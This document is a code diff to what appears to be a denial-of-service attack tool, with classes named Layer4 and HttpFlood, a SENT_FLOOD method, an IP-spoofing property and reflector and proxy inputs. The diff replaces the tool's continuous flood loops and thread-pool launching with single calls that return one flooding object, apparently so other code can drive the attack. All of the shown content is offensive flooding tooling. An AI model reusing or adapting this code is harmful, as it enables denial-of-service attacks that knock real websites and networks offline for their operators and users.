@@ -326,8 +326,8 @@ class Layer4:
 
     def run(self) -> None:
         self.select(self._method)
-        while self._event.is_set():
-            self.SENT_FLOOD()
+        # while self._event.is_set():
+        self.SENT_FLOOD()
 
     def open_connection(self,
                         conn_type=AF_INET,
@@ -613,8 +613,8 @@ class HttpFlood:
 
     def run(self) -> None:
         self.select(self._method)
-        while self._event.is_set():
-            self.SENT_FLOOD()
+        # while self._event.is_set():
+        self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -1047,7 +1047,7 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
-    threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
+    # threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
     if method in Methods.LAYER7_METHODS:
         useragent_li = ROOT_DIR / "files/useragent.txt"
         bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1073,12 +1073,14 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
         if not referers:
             exit("Empty Referer File ")
 
-        for thread_id in range(threads):
-            thread_pool.submit(
-                HttpFlood(thread_id, url, ip, method, rpc, event,
-                          uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).run
-            )
-
+        #for thread_id in range(threads):
+        #    thread_pool.submit(
+        #        HttpFlood(thread_id, url, ip, method, rpc, event,
+        #                  uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).run
+        #    )
+        return HttpFlood(0, url, ip, method, rpc, event,
+                         uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND)
+    
     if method in Methods.LAYER4_METHODS:
         port = url.port
 
@@ -1102,8 +1104,11 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
             if not ref:
                 exit("Empty Reflector File ")
 
-        for _ in range(threads):
-            thread_pool.submit(
-                Layer4((ip, port), ref, method, event,
-                       proxies, REQUESTS_SENT, BYTES_SEND).run
-            )
+        #for _ in range(threads):
+        #    thread_pool.submit(
+        #        Layer4((ip, port), ref, method, event,
+        #               proxies, REQUESTS_SENT, BYTES_SEND).run
+        #    )
+
+        return Layer4((ip, port), ref, method, event,
+                       proxies, REQUESTS_SENT, BYTES_SEND)
